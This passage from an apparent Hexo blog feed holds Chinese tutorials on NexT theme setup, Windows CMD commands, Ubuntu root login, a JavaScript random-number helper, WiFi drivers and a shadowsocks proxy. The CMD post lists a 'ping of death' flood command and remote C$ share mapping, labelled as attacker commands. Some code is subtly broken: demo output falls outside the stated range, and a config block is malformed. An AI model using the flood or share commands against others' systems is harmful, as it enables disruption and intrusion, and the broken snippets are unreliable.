</code></pre><h1 id="使用-NexT-主题让站点更酷炫"><a href="#使用-NexT-主题让站点更酷炫" class="headerlink" title="使用 NexT 主题让站点更酷炫"></a>使用 NexT 主题让站点更酷炫</h1><blockquote><p>参考链接<br><br><a href="//theme-next.iissnan.com/">NexT 参考文档</a><br><br><a href="//theme-next.iissnan.com/theme-settings.html">NexT 主题配置</a><br><br><a href="//theme-next.iissnan.com/third-party-services.html">NexT 第三方服务</a><br><br><a href="//theme-next.iissnan.com/faqs.html">更多的配置问题</a></p></blockquote><h2 id="下载主题"><a href="#下载主题" class="headerlink" title="下载主题"></a>下载主题</h2><pre><code class="bash">cd &lt;yourFolder&gt;
git clone https://github.com/iissnan/hexo-theme-next themes/next
</code></pre><h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><pre><code class="bash">vim ./_config.yml
</code></pre><p>修改</p><pre><code class="bash">theme: next
</code></pre><h2 id="验证主题效果"><a href="#验证主题效果" class="headerlink" title="验证主题效果"></a>验证主题效果</h2><pre><code class="bash">hexo s --debug
</code></pre><p>访问 <code>//localhost:4000</code>，确保站点正确运行</p><h2 id="站内搜索"><a href="#站内搜索" class="headerlink" title="站内搜索"></a>站内搜索</h2><h3 id="安装-hexo-generator-search"><a href="#安装-hexo-generator-search" class="headerlink" title="安装 hexo-generator-search"></a>安装 hexo-generator-search</h3><pre><code class="bash">npm install hexo-generator-search --save
</code></pre><h3 id="编辑配置文件-config-yml"><a href="#编辑配置文件-config-yml" class="headerlink" title="编辑配置文件 ./_config.yml"></a>编辑配置文件 <code>./_config.yml</code></h3><p>在任意位置添加以下内容</p><pre><code class="bash">search:
  path: search.xml
  field: post
  format: html
  limit: 10000
</code></pre><h3 id="编辑主题配置文件-themes-next-config-yml"><a href="#编辑主题配置文件-themes-next-config-yml" class="headerlink" title="编辑主题配置文件 ./themes/next/_config.yml"></a>编辑主题配置文件 <code>./themes/next/_config.yml</code></h3><pre><code class="bash"># Local search
local_search:
  enable: true
</code></pre><h2 id="开启字数统计和阅读时长"><a href="#开启字数统计和阅读时长" class="headerlink" title="开启字数统计和阅读时长"></a>开启字数统计和阅读时长</h2><h3 id="安装-hexo-wordcount"><a href="#安装-hexo-wordcount" class="headerlink" title="安装 hexo-wordcount"></a>安装 hexo-wordcount</h3><pre><code class="bash">npm install hexo-wordcount --save
</code></pre><h3 id="编辑主题配置文件-themes-next-config-yml-1"><a href="#编辑主题配置文件-themes-next-config-yml-1" class="headerlink" title="编辑主题配置文件 ./themes/next/_config.yml"></a>编辑主题配置文件 <code>./themes/next/_config.yml</code></h3><pre><code class="bash">post_wordcount:
  item_text: true
  wordcount: true
  min2read: true
</code></pre><h1 id="我的配置（只写出部分配置）"><a href="#我的配置（只写出部分配置）" class="headerlink" title="我的配置（只写出部分配置）"></a>我的配置（只写出部分配置）</h1><h2 id="站点配置文件"><a href="#站点配置文件" class="headerlink" title="站点配置文件"></a>站点配置文件</h2><p><code>./_config.yml</code></p><pre><code class="bash"># Site
language: zh-Hans

# search
search:
  path: search.xml
  field: post

# URL
url: ./

# Writing
highlight:
  enable: true
  line_number: true
  auto_detect: true
  tab_replace:

# Pagination
per_page: 5
pagination_dir: page

# Extensions
theme: next

# Deployment
deploy:
  type: git
  repo: git@github.com:vxhly/vxhly.github.io.git
  branch: master
</code></pre><h2 id="主题配置文件文件"><a href="#主题配置文件文件" class="headerlink" title="主题配置文件文件"></a>主题配置文件文件</h2><p><code>./themes/next/_config.yml</code></p><pre><code class="bash"># Specify the date when the site was setup
since: 2016

# Footer `powered-by` and `theme-info` copyright
copyright: true

menu:
  home: /
  categories: /categories
  #about: /about
  archives: /archives
  tags: /tags
  #sitemap: /sitemap.xml
  commonweal: /404.html

# Schemes
#scheme: Muse
scheme: Mist
#scheme: Pisces

# Social Links
social:
  #LinkLabel: Link
  GitHub: //github.com/vxhly
  Weibo: //weibo.com/5039312152

# Automatically scroll page to section which is under &lt;!-- more --&gt; mark.
scroll_to_more: true

# Automatically Excerpt. Not recommand.
auto_excerpt:
  enable: true
  length: 150

# Code Highlight theme
highlight_theme: night eighties

# Duoshuo ShortName
duoshuo_shortname: vxhly
  enable: true
  length: 150

# Post wordcount display settings
post_wordcount:
  item_text: true
  wordcount: true
  min2read: true

# Share
duoshuo_share: true

# Make duoshuo show UA
duoshuo_info:
  ua_enable: true
  admin_enable: true
  user_id: 13846473
  admin_nickname: Author
</code></pre><h2 id="腾讯公益-404-页面"><a href="#腾讯公益-404-页面" class="headerlink" title="腾讯公益 404 页面"></a>腾讯公益 404 页面</h2><p><code>./source/404.html</code></p><pre><code class="html">&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8;&quot;/&gt;
  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot; /&gt;
  &lt;meta name=&quot;robots&quot; content=&quot;all&quot; /&gt;
  &lt;meta name=&quot;robots&quot; content=&quot;index,follow&quot;/&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;//www.qq.com/404/search_children.js&quot; charset=&quot;utf-8&quot; homePageUrl=&quot;/&quot; homePageName=&quot;回到我的主页&quot;&gt;
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> design </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Git </tag>
            
            <tag> Node.js </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CMD 常用命令]]></title>
      <url>/2016/08/cmd-commands/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:16 GMT+0800 (中国标准时间) --><p>记录 windows 下常用的 CMD 命令<a id="more"></a></p><h1 id="改变-CMD-显示颜色"><a href="#改变-CMD-显示颜色" class="headerlink" title="改变 CMD 显示颜色"></a>改变 CMD 显示颜色</h1><pre><code class="bash">color 0
</code></pre><h2 id="支持的颜色"><a href="#支持的颜色" class="headerlink" title="支持的颜色"></a>支持的颜色</h2><ul><li>0 = 黑色</li><li>1 = 蓝色</li><li>2 = 绿色</li><li>3 = 浅绿色</li><li>4 = 红色</li><li>5 = 紫色</li><li>6 = 黄色</li><li>7 = 白色</li><li>8 = 灰色</li><li>9 = 淡蓝色</li><li>A = 淡绿色</li><li>B = 淡浅绿色</li><li>C = 淡红色</li><li>D = 淡紫色</li><li>E = 淡黄色</li><li>F = 亮白色</li></ul><h1 id="用户和用户组相关的命令"><a href="#用户和用户组相关的命令" class="headerlink" title="用户和用户组相关的命令"></a>用户和用户组相关的命令</h1><h2 id="添加或删除用户"><a href="#添加或删除用户" class="headerlink" title="添加或删除用户"></a>添加或删除用户</h2><p><code>For Example:</code></p><pre><code class="bash">// 添加一个永不过期的用户，并且设置登录口令
net user [userName] [password] /add /expires:never

// 删除用户
net user [userName] /delete
将用户添加到管理员组或从管理员组删除

// 将用户添加到管理员组
net localgroup Administrators [userName] /add

// 将用户从管理员组删除
net localgroup Administrators [userName] /delete

// 修改当前用户的密码
net user [userName] [password]
</code></pre><h2 id="激活或禁用用户"><a href="#激活或禁用用户" class="headerlink" title="激活或禁用用户"></a>激活或禁用用户</h2><p><code>For Example:</code></p><pre><code class="bash">net user [userName] /active:yes    // 激活用户
net user [userName] /active:no    // 禁用用户
</code></pre><h2 id="新建或删除用户组"><a href="#新建或删除用户组" class="headerlink" title="新建或删除用户组"></a>新建或删除用户组</h2><p><code>For Example:</code></p><pre><code class="bash">net localgroup [groupName] /add      // 新建用户组
net localgroup [groupName] /delete    // 删除用户组
</code></pre><h1 id="文件和目录相关命令"><a href="#文件和目录相关命令" class="headerlink" title="文件和目录相关命令"></a>文件和目录相关命令</h1><h2 id="列出目录结构"><a href="#列出目录结构" class="headerlink" title="列出目录结构"></a>列出目录结构</h2><p><code>For Example:</code></p><pre><code class="bash">dir [path]:\[folderName]
dir /a:h /s    // 显示当前目录及其子目录下的隐藏文件
dir /a:s /s    // 显示当前目录及其子目录下的系统文件
dir /a:r /s    // 显示当前目录及其子目录下的只读文件
dir /a:a /s    // 显示当前目录及其子目录下的存档文件
</code></pre><h2 id="创建文件并向文件输出信息"><a href="#创建文件并向文件输出信息" class="headerlink" title="创建文件并向文件输出信息"></a>创建文件并向文件输出信息</h2><p><code>For Example:</code></p><pre><code class="bash">echo &quot;test text&quot; &gt; 1.txt    // 覆盖
echo &quot;tesr text&quot; &gt;&gt; 1.txt   // 追加
conpy con [path]:\[fileName]    // ctrl+Z 回车结束输入
</code></pre><h2 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h2><p><code>For Example:</code></p><pre><code class="bash">md [folderName]
</code></pre><h2 id="切换目录、盘符"><a href="#切换目录、盘符" class="headerlink" title="切换目录、盘符"></a>切换目录、盘符</h2><p><code>For Example:</code></p><pre><code class="bash">cd [path]:\[folderName]
cd /      // 切换到根目录
d:        // 切换到 D 盘
</code></pre><h2 id="删除文件或目录"><a href="#删除文件或目录" class="headerlink" title="删除文件或目录"></a>删除文件或目录</h2><p><code>For Example:</code></p><pre><code class="bash">del [fileName]           // 删除文件
rd [folderName]          // 删除空目录（目录中不能有子目录和文件）
rd [folderName] /S /Q    // 删除目录并同时删除目录中的子目录以及文件
</code></pre><h2 id="移动或复制文件"><a href="#移动或复制文件" class="headerlink" title="移动或复制文件"></a>移动或复制文件</h2><p><code>For Example:</code></p><pre><code class="bash">move [path]:\[fileName] [path]:\[fileName]    // 移动文件（也可重命名）
copy [path]:\[fileName] [path]:\[fileName]    // 复制单文件

// 复制目录及其子目录（包含空目录）
xcopy [path]:\[folderName] [path]:\[folderName] /E

// 复制目录及其子目录（不包含空目录）
xcopy path:\[folderName] [path]:\[folderName] /S

// 复制隐藏文件和系统文件
xcopy [path]:\[fileName] [path]:\[fileName] /H
</code></pre><h2 id="查看文件的内容"><a href="#查看文件的内容" class="headerlink" title="查看文件的内容"></a>查看文件的内容</h2><p><code>For Example:</code></p><pre><code class="bash">type [fileName]     // 在 DOS 下查看
start [fileName]    // 调用默认程序查看
</code></pre><h2 id="设置文件或目录属性"><a href="#设置文件或目录属性" class="headerlink" title="设置文件或目录属性"></a>设置文件或目录属性</h2><p><code>For Example:</code></p><pre><code class="bash">attrib +S +H [path]:\[fileName]    // 添加系统文件和隐藏文件属性

// 处理文件夹及子文件里匹配的文件（包含该文件夹）
attrib +S +H [path]:\[fileName] /S /D
</code></pre><h2 id="重命名"><a href="#重命名" class="headerlink" title="重命名"></a>重命名</h2><p><code>For Example:</code></p><pre><code class="bash">ren [fileName1] [fileName2]
</code></pre><h2 id="显示目录树"><a href="#显示目录树" class="headerlink" title="显示目录树"></a>显示目录树</h2><p><code>For Example:</code></p><pre><code class="bash">tree [path]:\[folderName] /F
</code></pre><h1 id="网络、服务相关"><a href="#网络、服务相关" class="headerlink" title="网络、服务相关"></a>网络、服务相关</h1><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p><code>For Example:</code></p><pre><code class="bash">ping -t -l 65500 [IP or domain]      // 死亡之 ping
ping [ip]                           // 测试网络的连通性
</code></pre><h2 id="ipconfig"><a href="#ipconfig" class="headerlink" title="ipconfig"></a>ipconfig</h2><p><code>For Example:</code></p><pre><code class="bash">ipconfig  -all      // 查看当前所有的 ip 地址信息
ipconfig /release   // 清除当前获取到的 ip 地址
ipconfig /renew     // 重新获取 ip 地址
</code></pre><h2 id="natstat"><a href="#natstat" class="headerlink" title="natstat"></a>natstat</h2><p><code>For Example:</code></p><pre><code class="bash">netstat -ano    // 列出所有端口的使用情况
netstat -o      // 显示连接进程的情况，通常用于查找是否有木马程序
</code></pre><h2 id="arp"><a href="#arp" class="headerlink" title="arp"></a>arp</h2><p><code>For Example:</code></p><pre><code class="bash">arp -a      // 显示 ARP 列表
arp -d      // 清除 ARP 列表，需要管理员权限
arp -s [ip] [macAddress]    // 添加静态项
</code></pre><h2 id="net"><a href="#net" class="headerlink" title="net"></a>net</h2><p><code>For Example:</code></p><pre><code class="bash">net view      // 查看当前局域网内的其他连接者
net start     // 查看开启了哪些服务
net start [serviceName]     // 开启某一个服务
net stop [serviceName]      // 停止某一个服务

// 将某一个服务器的 C 盘映射成 K 盘，攻击者常用命令
net use k: \\[ipAddress]\c$

// 以下命令建议需管理员权限
net share             // 查看本地开启的共享
net share ipc$        // 开启 ipc$ 共享
net share ipc$ /del   // 删除 ipc$ 共享
net share c$ /del     // 删除 C 盘的共享
</code></pre><h2 id="tracert"><a href="#tracert" class="headerlink" title="tracert"></a>tracert</h2><p><code>For Example:</code></p><pre><code class="bash">tracert [IP or domain]       // 跟踪路由
</code></pre><h2 id="mstsc"><a href="#mstsc" class="headerlink" title="mstsc"></a>mstsc</h2><p><code>For Example:</code></p><pre><code class="bash">mstsc /v: [ip] /console     // 远程连接
</code></pre><h1 id="关机和重启"><a href="#关机和重启" class="headerlink" title="关机和重启"></a>关机和重启</h1><p><code>For Example:</code></p><pre><code class="bash">shutdown -s -t 180 -c &quot;确定关机吗？&quot;
</code></pre><p>选项解释</p><ul><li><code>-s</code> 关机</li><li><code>-r</code> 重启</li><li><code>-t</code> 指定时间</li><li><code>-c</code> 对话框确认信息</li><li><code>-a</code> 取消上一个任务</li></ul><h1 id="获取命令的帮助信息"><a href="#获取命令的帮助信息" class="headerlink" title="获取命令的帮助信息"></a>获取命令的帮助信息</h1><p><code>For Example:</code></p><pre><code class="bash">net help [command]
help [command]
[command] /?
</code></pre><h1 id="系统文件修复（需管理员权限）"><a href="#系统文件修复（需管理员权限）" class="headerlink" title="系统文件修复（需管理员权限）"></a>系统文件修复（需管理员权限）</h1><h2 id="查看当前的系统信息"><a href="#查看当前的系统信息" class="headerlink" title="查看当前的系统信息"></a>查看当前的系统信息</h2><p><code>For Example:</code></p><pre><code class="bash">systeminfo
</code></pre><h2 id="扫描系统文件错误并复原"><a href="#扫描系统文件错误并复原" class="headerlink" title="扫描系统文件错误并复原"></a>扫描系统文件错误并复原</h2><p><code>For Example:</code></p><pre><code class="bash">sfc /scannow
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> windows </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Security </tag>
            
            <tag> Windows </tag>
            
            <tag> Command </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu 开启 root 用户]]></title>
      <url>/2016/08/ubuntu-enble-root/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>Ubuntu 默认不开启 root 账户的，所以有需开启 root 账户的按照以下做法即可，切换 root 账户后 chromium 浏览器不能使用<a id="more"></a></p><h1 id="打开终端开启-root-账户"><a href="#打开终端开启-root-账户" class="headerlink" title="打开终端开启 root 账户"></a>打开终端开启 root 账户</h1><pre><code class="bash">sudo passwd -u root
</code></pre><h1 id="为-root-账户设置密码"><a href="#为-root-账户设置密码" class="headerlink" title="为 root 账户设置密码"></a>为 root 账户设置密码</h1><blockquote><p>输入两次</p></blockquote><pre><code class="bash">sudo passwd root
</code></pre><h2 id="测试-root-账户"><a href="#测试-root-账户" class="headerlink" title="测试 root 账户"></a>测试 root 账户</h2><blockquote><p>输入 root 密码，进入 root 终端</p></blockquote><pre><code class="bash">su -
</code></pre><h1 id="设置登录面板，使其实现-root-登录"><a href="#设置登录面板，使其实现-root-登录" class="headerlink" title="设置登录面板，使其实现 root 登录"></a>设置登录面板，使其实现 root 登录</h1><p>使用 <code>vim</code></p><pre><code class="bash">sudo vim /usr/share/lightdm/lightdm.conf.d/50-unity-greeter.conf
</code></pre><p>使用 <code>gedit</code></p><pre><code class="bash">sudo gedit /usr/share/lightdm/lightdm.conf.d/50-unity-greeter.conf
</code></pre><p>添加如下代码,保存退出</p><pre><code class="bash">user-session=ubuntu
greeter-show-manual-login=true
all-guest=false
</code></pre><h1 id="重启-ubuntu，需切换-root-账户"><a href="#重启-ubuntu，需切换-root-账户" class="headerlink" title="重启 ubuntu，需切换 root 账户"></a>重启 ubuntu，需切换 root 账户</h1><pre><code class="bash">su -
reboot
</code></pre><h1 id="删除原先账户"><a href="#删除原先账户" class="headerlink" title="删除原先账户"></a>删除原先账户</h1><blockquote><p>如果你不喜欢原先的账户，大可以彻底删除用户</p></blockquote><h2 id="在-root-用户下"><a href="#在-root-用户下" class="headerlink" title="在 root 用户下"></a>在 root 用户下</h2><pre><code class="bash">userdel -r userName
</code></pre><h2 id="在普通用户下"><a href="#在普通用户下" class="headerlink" title="在普通用户下"></a>在普通用户下</h2><pre><code class="bash">sudo userdel -r userName
</code></pre><blockquote><p>注意：因为需要彻底删除用户，所以加上-r的选项，在删除用户的同时一起把这个用户的宿主目录和邮件目录删除；userName 需替换成你的原先账户名</p></blockquote><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> liunx </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JavaScript 生成随机数]]></title>
      <url>/2016/08/js-generated-random-number/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>为 JS 中的 Math 对象新增生成不重复随机数方法<a id="more"></a></p><h1 id="方法源码一"><a href="#方法源码一" class="headerlink" title="方法源码一"></a>方法源码一</h1><pre><code class="javascript">/**
 * Math 对象的扩展方法，可用于生成随机数
 * @param  {number} startNum  起始数，整型
 * @param  {number} endNum    终止数，整型
 * @param  {number} count     生成的个数，整型
 * @param  {boolean} repeat   是否重复，true or false
 * @return {Array}            返回数组
 */
Math.randNum = function(startNum, endNum, count, repeat) {
  if (repeat) {
    var ret = new Array();
    for (var i = 0; i &lt; count; i++) {
      // 生成区间范围内的随机数
      ret[i] = Math.floor(Math.random() * (endNum - startNum) + startNum);
    }
    return ret;
  } else {
    var tmp = new Array();
    for (var i = 0;; i++) {
      if (tmp.length &lt; count) {
        // 生成区间范围内的随机数
        var rand = Math.floor(Math.random() * (endNum - startNum) + startNum);
        for (var i = 0; i &lt; tmp.length; i++) {
          if (tmp[i] == rand) {
            // 将生成的随机数进行比对，如果相同则重新生成
            return Math.randNum(startNum, endNum, count, repeat);
          }
        }
        // 向数组添加数据
        tmp.push(rand);
      } else {
        break;
      }
    }
    return tmp;
  }
}
</code></pre><h2 id="如何调用"><a href="#如何调用" class="headerlink" title="如何调用"></a>如何调用</h2><pre><code class="javascript">Math.randNum(number,number,number,true|false);
</code></pre><h2 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a>demo1</h2><p>控制台代码</p><pre><code class="javascript">console.log(Math.randNum(3,16,5,true);)
</code></pre><p>输出 =&gt; <code>[4, 15, 15, 15, 17]</code></p><h2 id="demo2"><a href="#demo2" class="headerlink" title="demo2"></a>demo2</h2><p>控制台代码</p><pre><code class="javascript">console.log(Math.randNum(3,16,5,false);)
</code></pre><p>输出 =&gt; <code>[15, 14, 6, 11, 4]</code></p><h1 id="方法源码二"><a href="#方法源码二" class="headerlink" title="方法源码二"></a>方法源码二</h1><blockquote><p>一种更简单的写法</p></blockquote><pre><code class="javascript">var arr = new Array(); //新建一个数组

// 向数组赋值 0~100
for (var i = 0; i &lt;= 100; i ++) {
    arr.push(i);
}

// 随机排位
arr.sort(
    function () {
        return 0.5 - Math.random();
    }
);

arr.length = 50; // 指定数组长度

document.write(arr); // 输出数组
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> design </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> Code </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu 下连接 WIFI]]></title>
      <url>/2016/08/ubuntu-connect-wifi/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>基于已经安装双系统，或是只有 Ubuntu 系统，在虚拟机下不存在此问题<a id="more"></a></p><h1 id="查看无线网卡信息"><a href="#查看无线网卡信息" class="headerlink" title="查看无线网卡信息"></a>查看无线网卡信息</h1><pre><code class="bash">lspci | grep -i network
</code></pre><h1 id="下载无线网卡驱动"><a href="#下载无线网卡驱动" class="headerlink" title="下载无线网卡驱动"></a>下载无线网卡驱动</h1><p>本人的无线网卡为 <code>Realtek-RTL8723BE</code></p><blockquote><p>下载地址 [rtl8723be.tar.gz](<a href="http://oaq0p7t2g.bkt.clouddn.com/rtl8723be.tar.gz?attname=）" target="_blank" rel="external">http://oaq0p7t2g.bkt.clouddn.com/rtl8723be.tar.gz?attname=）</a></p></blockquote><h2 id="驱动安装-解压进入目录"><a href="#驱动安装-解压进入目录" class="headerlink" title="驱动安装(解压进入目录)"></a>驱动安装(解压进入目录)</h2><pre><code class="bash">make
sudo make install
sudo modprobe rtl8723be (rtl8723be 需替换成自己的网卡)
</code></pre><h2 id="设置为开机启动项"><a href="#设置为开机启动项" class="headerlink" title="设置为开机启动项"></a>设置为开机启动项</h2><pre><code class="bash">sudo modprobe -r rtl8723be (rtl8723be 需替换成自己的网卡)
sudo modprobe rtl8723be (rtl8723be 需替换成自己的网卡)
</code></pre><h2 id="重启网卡"><a href="#重启网卡" class="headerlink" title="重启网卡"></a>重启网卡</h2><pre><code class="bash">ifconfig wlan0 down
ifconfig wlan0 up
</code></pre><h2 id="重启网络服务"><a href="#重启网络服务" class="headerlink" title="重启网络服务"></a>重启网络服务</h2><pre><code class="bash">service network restart
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> networking </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Network </tag>
            
            <tag> Software </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu 下科学上网]]></title>
      <url>/2016/07/ubuntu-over-the-wall/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>翻墙，主要用于 npm 的代理。没有 vpn 服务器不要紧，肯花点小钱就可以搞定（访问 <a href="//www.gaotizi.com/aff.php?aff=133">高梯子</a>）<a id="more"></a></p><h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><h2 id="下载-shadowsocks-libev"><a href="#下载-shadowsocks-libev" class="headerlink" title="下载 shadowsocks-libev"></a>下载 shadowsocks-libev</h2><p>下载 shadowsocks-libev 安装包，解压并重命名为 shadowsocks-libev</p><blockquote><p><a href="//github.com/shadowsocks/shadowsocks-libev/archive/v2.4.6.zip">Source code (zip) 下载地址</a><br><br><a href="//github.com/shadowsocks/shadowsocks-libev/archive/v2.4.6.tar.gz">Source code (tar.gz) 下载地址</a></p></blockquote><h2 id="安装-shadowsocks-libev"><a href="#安装-shadowsocks-libev" class="headerlink" title="安装 shadowsocks-libev"></a>安装 shadowsocks-libev</h2><pre><code class="bash">cd shadowsocks-libev
sudo apt-get install build-essential autoconf libtool libssl-dev \
    gawk debhelper dh-systemd init-system-helpers pkg-config
dpkg-buildpackage -us -uc -i
cd ..
sudo dpkg -i shadowsocks-libev*.deb
</code></pre><h3 id="建议安装前先更新一下软件列表"><a href="#建议安装前先更新一下软件列表" class="headerlink" title="建议安装前先更新一下软件列表"></a>建议安装前先更新一下软件列表</h3><p>如果显示 “现在没有可用的软件包” 等字样，建议先执行</p><pre><code class="bash">sudo rm /var/lib/apt/lists/* -vf
sudo apt-get update
sudo apt-get upgrade
</code></pre><h2 id="配置-config-json-文件"><a href="#配置-config-json-文件" class="headerlink" title="配置 config.json 文件"></a>配置 config.json 文件</h2><p>使用 <code>vim</code></p><pre><code class="bash">sudo vim /etc/shadowsocks-libev/config.json
</code></pre><p>或者使用 <code>gedit</code></p><pre><code class="bash">sudo gedit /etc/shadowsocks-libev/config.json
</code></pre><h3 id="修改服务器地址跟密码"><a href="#修改服务器地址跟密码" class="headerlink" title="修改服务器地址跟密码"></a>修改服务器地址跟密码</h3><pre><code class="json">{
  &quot;server&quot;: &quot;&quot;,
  &quot;server_port&quot;: 8388,
  &quot;local_port&quot;: 1080,
  &quot;password&quot;: &quot;&quot;,
  &quot;timeout&quot;: 60,
  &quot;method&quot;: &quot;rc4-md5&quot;
}
</code></pre><h2 id="配置-shadowsocks-libev-文件"><a href="#配置-shadowsocks-libev-文件" class="headerlink" title="配置 shadowsocks-libev 文件"></a>配置 shadowsocks-libev 文件</h2><p>使用 <code>vim</code></p><pre><code class="bash">sudo vim /etc/init.d/shadowsocks-libev
</code></pre><p>或者使用 <code>gedit</code></p><pre><code class="bash">sudo gedit /etc/init.d/shadowsocks-libev
</code></pre><h3 id="修改文件"><a href="#修改文件" class="headerlink" title="修改文件"></a>修改文件</h3><pre><code class="bash">DAEMON=/usr/bin/ss-server
</code></pre><p>=&gt;</p><pre><code class="bash">DAEMON=/usr/bin/ss-local
</code></pre><h2 id="启动-shadowsocks-libev"><a href="#启动-shadowsocks-libev" class="headerlink" title="启动 shadowsocks-libev"></a>启动 shadowsocks-libev</h2><pre><code class="bash">sudo service shadowsocks-libev restart
</code></pre><h2 id="安装-Privoxy"><a href="#安装-Privoxy" class="headerlink" title="安装 Privoxy"></a>安装 Privoxy</h2><pre><code class="bash">sudo apt-get install privoxy
</code></pre><h3 id="配置-Privoxy"><a href="#配置-Privoxy" class="headerlink" title="配置 Privoxy"></a>配置 Privoxy</h3><p>使用 <code>vim</code></p><pre><code class="bash">sudo vim /etc/privoxy/config
</code></pre><p>或者使用 <code>gedit</code></p><pre><code class="bash">sudo gedit /etc/privoxy/config
</code></pre><p>按 <code>shift+g</code> 切到最后一行，添加</p><pre><code class="bash">forward-socks5 / 127.0.0.1:1080 .
</code></pre><h2 id="配置终端-http-代理"><a href="#配置终端-http-代理" class="headerlink" title="配置终端 http 代理"></a>配置终端 http 代理</h2><pre><code class="bash">export http_proxy=&quot;127.0.0.1:8118&quot;
export https_proxy=&quot;127.0.0.1:8118&quot;
</code></pre><h3 id="配置终端-http-代理的启动"><a href="#配置终端-http-代理的启动" class="headerlink" title="配置终端 http 代理的启动"></a>配置终端 http 代理的启动</h3><p>使用 <code>vim</code></p><pre><code class="bash">sudo vim ~/.bashrc
</code></pre><p>或者使用 <code>gedit</code></p><pre><code class="bash">sudo gedit ~/.bashrc
</code></pre><p>按 <code>shift+g</code> 切到最后一行，添加</p><pre><code class="bash">export http_proxy=&quot;127.0.0.1:8118&quot;
export https_proxy=&quot;127.0.0.1:8118&quot;
</code></pre><blockquote><p>如果此举会影响到终端下载，建议还是不要设置为好。</p></blockquote><h2 id="启动-Privoxy"><a href="#启动-Privoxy" class="headerlink" title="启动 Privoxy"></a>启动 Privoxy</h2><pre><code class="bash">sudo service privoxy restart
</code></pre><h2 id="测试代理是否成功（需安装-curl）"><a href="#测试代理是否成功（需安装-curl）" class="headerlink" title="测试代理是否成功（需安装 curl）"></a>测试代理是否成功（需安装 curl）</h2><pre><code class="bash">curl //www.google.com.hk
</code></pre><p>返回带 <code>google</code> 字样表示受理成功</p><h2 id="配置-npm-代理（需安装-node、npm）"><a href="#配置-npm-代理（需安装-node、npm）" class="headerlink" title="配置 npm 代理（需安装 node、npm）"></a>配置 npm 代理（需安装 node、npm）</h2><pre><code class="bash">npm config set proxy //127.0.0.1:8118
npm config set https-proxy //127.0.0.1:8118
</code></pre><h3 id="清除-npm-代理"><a href="#清除-npm-代理" class="headerlink" title="清除 npm 代理"></a>清除 npm 代理</h3><pre><code class="bash">npm config delete proxy
npm config delete https-proxy
</code></pre><h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><h2 id="安装-shadowsocks"><a href="#安装-shadowsocks" class="headerlink" title="安装 shadowsocks"></a>安装 shadowsocks</h2><pre><code class="bash">sudo apt-get install python-gevent python-pip python-setuptools m2crypto
sudo pip install shadowsocks
</code></pre><h3 id="建议安装前先更新一下软件列表-1"><a href="#建议安装前先更新一下软件列表-1" class="headerlink" title="建议安装前先更新一下软件列表"></a>建议安装前先更新一下软件列表</h3><pre><code class="bash">sudo apt-get update
sudo apt-get upgrade
</code></pre><h2 id="新建-shadowsocks-json-文件"><a href="#新建-shadowsocks-json-文件" class="headerlink" title="新建 shadowsocks.json 文件"></a>新建 shadowsocks.json 文件</h2><p>使用 <code>vim</code></p><pre><code class="bash">sudo vim /etc/shadowsocks.json
</code></pre><p>或使用 <code>gedit</code></p><pre><code class="bash">sudo gedit /etc/shadowsocks.json
</code></pre><h3 id="添加内容"><a href="#添加内容" class="headerlink" title="添加内容"></a>添加内容</h3><pre><code class="json">{
  &quot;server&quot;: &quot;&quot;,
  &quot;server_port&quot;: 8388,
  &quot;local_port&quot;: 1080,
  &quot;password&quot;: &quot;&quot;,
  &quot;timeout&quot;: 60,
  &quot;method&quot;: &quot;rc4-md5&quot;
}
</code></pre><h2 id="启动-shadowsocks"><a href="#启动-shadowsocks" class="headerlink" title="启动 shadowsocks"></a>启动 shadowsocks</h2><pre><code class="bash">sslocal -c /etc/shadowsocks.json
</code></pre><p>设置为启动时自动运行。在 <code>/etc/rc.local</code> 中添加如下命令，注意在 <code>exit 0</code> 之前。</p><pre><code class="bash">sudo sslocal -c /etc/shadowsocks.json
</code></pre><h2 id="安装-Privoxy-1"><a href="#安装-Privoxy-1" class="headerlink" title="安装 Privoxy"></a>安装 Privoxy</h2><pre><code class="bash">sudo apt-get install privoxy
